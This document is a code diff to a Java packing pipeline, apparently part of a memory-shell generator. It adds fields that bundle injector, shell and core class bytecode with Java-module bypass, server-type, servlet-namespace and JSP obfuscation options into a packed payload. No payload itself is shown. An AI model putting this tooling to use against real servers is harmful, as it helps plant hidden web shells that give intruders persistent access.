@@ -6,6 +6,8 @@ import org.leo.jmg.generation.GenerationWorkspace;
 import org.leo.jmg.mem.packer.ClassPackerConfig;
 
 import java.util.Base64;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
 /**
  * 将最终 Injector 字节码交给已解析的 Packer。
@@ -40,10 +42,33 @@ public final class PackingPipeline {
         config.setClassBytes(bytecode);
         config.setClassBytesBase64Str(
                 Base64.getEncoder().encodeToString(bytecode));
-        config.setByPassJavaModule(request.isBypassJavaModule());
+        config.setByPassJavaModule(request.isBypassJavaModuleEffective());
+        config.setTargetJavaVersion(request.getTargetJavaVersion());
+        config.setServletNamespace(request.getEffectiveServletNamespace());
+        config.setProtocol(request.getProtocol().getValue());
+        config.setServerType(request.getServerType());
+        config.setInjectorName(request.getInjectorName());
+        config.setLambdaSuffix(request.isLambdaSuffix());
+        config.setStaticInitialize(request.isStaticInitialize());
+        config.setShrink(request.isShrink());
+        Map<String, byte[]> classEntries = new LinkedHashMap<String, byte[]>();
+        addClassEntry(classEntries, request.getCoreClassName(),
+                workspace.getCoreClassBytes());
+        addClassEntry(classEntries, workspace.getShellClassName(),
+                workspace.getShellClassBytes());
+        addClassEntry(classEntries, workspace.getInjectorClassName(), bytecode);
+        config.setClassEntries(classEntries);
         config.setJspObfuscationSteps(request.getJspObfuscationSteps());
         config.setObfuscationSeed(request.getObfuscationSeed());
         config.setCustomTemplate(request.getCustomJspTemplate());
         return plan.getPacker().pack(config);
+    }
+
+    private static void addClassEntry(Map<String, byte[]> entries,
+                                      String className,
+                                      byte[] bytes) {
+        if (className != null && bytes != null) {
+            entries.put(className.replace('.', '/') + ".class", bytes);
+        }
     }
 }
